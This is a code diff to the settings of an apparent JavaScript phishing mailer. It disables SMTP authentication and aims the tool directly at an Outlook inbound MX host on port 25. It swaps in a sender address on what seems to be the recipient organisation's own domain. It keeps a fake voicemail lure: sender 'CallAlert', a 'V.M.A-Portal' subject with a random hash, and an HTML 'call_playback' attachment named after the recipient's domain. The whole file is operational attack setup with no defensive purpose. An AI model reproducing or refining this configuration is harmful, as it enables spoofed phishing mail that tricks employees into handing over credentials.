@@ -99,11 +99,11 @@ function replacePlaceholders(content, placeholders) {
 
 const options = {
   method: 'SMTP', // Options: 'SMTP', 'MX'
-  useAuthentication: true,
+  useAuthentication: false,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'smtp.kagoya.net',
-  smtpPort: 587,
+  smtpHost: 'gwtsbg-com0i.mail.protection.outlook.com',
+  smtpPort: 25,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
   smtpUsername: 'cradle.etono',
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['mizonokuchu@la-coco.com'];
+const senderAddresses = ['office@gwt-sbg.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "CallAlert"; 
 const subjectLineWithPlaceholders = "New V.M.A-Portal ID-{RANDOM_MD5}";
